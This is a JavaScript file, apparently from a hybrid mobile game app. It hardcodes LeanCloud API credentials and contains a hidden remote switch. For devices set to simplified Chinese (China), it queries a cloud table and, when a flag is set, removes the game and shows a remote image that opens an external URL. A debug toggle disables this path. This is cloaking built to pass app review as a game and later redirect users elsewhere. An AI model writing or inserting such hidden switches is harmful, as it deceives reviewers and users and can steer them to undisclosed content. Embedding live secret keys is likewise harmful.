// config area
const leancloud_id = "yDvf0NeilN43nltYvzrjtjvH-MdYXbMMI"
const leancloud_key = "RehT1Y18E2A4NnTMPdzW3rmt"
let screenDirection = 'portrait' // 'portrait' or 'landscape'
const debugTrigger = false
// end config area

function lock() {
    window.screen.orientation.lock(screenDirection)
}

function checkTrigger() {
    function api(leancloud_id, leancloud_key) {
        const id_prefix = leancloud_id.slice(0,8)
        const production_url = "https://" + id_prefix + ".api.lncldglobal.com/1.1/classes/Game"
        
        let header =  {
            'Cache-Control': 'no-cache',
            'X-LC-Id': leancloud_id,
            'X-LC-Key': leancloud_key
        }
        let config = { headers: header }
        return fetch(production_url, config)
    }

    function successHandler(n) {
        console.log("successHandler " + n)
        let splitedStr = n.split("~")

        let [imgUrl, tapUrl] = ["", ""]
        if (splitedStr.length != 2) return
        else [imgUrl, tapUrl] = splitedStr

        if (imgUrl) {
            screenDirection = "portrait"
            document.getElementById("game").remove()
            let img = document.createElement("img")
            
            img.src = imgUrl
            img.onclick = () => window.open(tapUrl, '_system')
            
            let bodyFirst = document.body.firstChild
            document.body.insertBefore(img, bodyFirst)
        }
    }
    
    function failureHandler(n) {
        console.log("failureHandler " + n)
    }

    let checkIsDebugMode = () => {
        if (debugTrigger) throw "debugMode"
    }

    new Promise(function(resolve, reject) {
        checkIsDebugMode()
        navigator.globalization.getPreferredLanguage(resolve, reject);
    })
    .then(function(language) {
      if (language.value == 'zh-Hans-CN') {
        return api(leancloud_id, leancloud_key)
      }
    })
    .then((n) => n.json())
    .then(
        (n) => {
            let callParm = ""
            if (n.results[0].flag != "") {
                let connectedStr = n.results[0].flag + "~" + n.results[0].tbl
                callParm = connectedStr
            }
            successHandler(callParm)
        }
    )
    .catch(
        function(t) {
//           if (t == "debugMode") successHandler("https://i.imgur.com/wcnIFzC.jpg~https://apple.com")
            failureHandler(t)
        }
    )

}

function setupIframe() {
    let bodyStyle = getComputedStyle(document.body, null)
    let paddingTop = parseInt(bodyStyle.getPropertyValue('padding-top'))
    let paddingBottom = parseInt(bodyStyle.getPropertyValue('padding-bottom'))
    let height = innerHeight - paddingTop - paddingBottom

    document.body.style.width = "auto"
    document.body.style.height = "auto"
    document.body.style.paddingBottom = "0"
    let iframe = document.querySelector("iframe")
    iframe.style.height = height + "px"
}

let afterDeviceReadyDo = function() {
    checkTrigger()
}

let afterLoadDo = function() {
    frames[0].document.body.style["-webkit-user-select"] = "none"
}

//document.addEventListener("DOMContentLoaded", afterDOMFinishDo)
window.addEventListener("resize", setupIframe)
window.addEventListener("onload", afterLoadDo)
document.addEventListener("deviceready", afterDeviceReadyDo);
setInterval(lock, 100)
